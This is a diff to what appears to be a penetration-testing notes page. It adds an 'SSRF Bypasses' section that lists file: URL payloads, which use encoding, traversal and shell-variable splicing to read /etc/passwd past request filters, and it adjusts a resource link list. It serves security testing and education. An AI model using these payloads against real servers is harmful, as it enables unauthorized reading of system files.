@@ -361,9 +361,29 @@ curl_close($ch);
 
 ````
 
+## SSRF Bypasses
+
+{% embed url="https://rodoassis.medium.com/on-ssrf-server-side-request-forgery-or-simple-stuff-rodolfo-found-part-i-4edf7ee75389" %}
+
+```
+file:/etc/passwd?/
+file:/etc/passwd%3F/
+file:/etc%252Fpasswd/
+file:/etc%252Fpasswd%3F/
+file:///etc/?/../passwd
+file:///etc/%3F/../passwd
+file:${br}/et${u}c/pas${te}swd?/
+file:$(br)/et$(u)c/pas$(te)swd?/
+file:${br}/et${u}c%252Fpas${te}swd?/
+file:$(br)/et$(u)c%252Fpas$(te)swd?/
+file:${br}/et${u}c%252Fpas${te}swd%3F/
+file:$(br)/et$(u)c%252Fpas$(te)swd%3F/
+file:///etc/passwd?/../passwd
+```
+
 ## Resources
 
-[https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery](https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery) [https://highon.coffee/blog/ssrf-cheat-sheet/](https://highon.coffee/blog/ssrf-cheat-sheet/) [URL Format Bypass - HackTricks](https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery/url-format-bypass) [SSRF vulnerabilities and where to find them - Detectify Labs](https://labs.detectify.com/2022/09/23/ssrf-vulns-and-where-to-find-them/?fbclid=IwAR0xC3ymb4ufRUGRDOZWr7lleeatiJj\_vH8dod9-84jKt0PN1z7evtHFccA)
+[https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery](https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery) [https://highon.coffee/blog/ssrf-cheat-sheet/](https://highon.coffee/blog/ssrf-cheat-sheet/) [URL Format Bypass - HackTricks](https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery/url-format-bypass) [SSRF vulnerabilities and where to find them - Detectify Labs](https://labs.detectify.com/2022/09/23/ssrf-vulns-and-where-to-find-them/?fbclid=IwAR0xC3ymb4ufRUGRDOZWr7lleeatiJj_vH8dod9-84jKt0PN1z7evtHFccA)
 
 #### Youtube
 
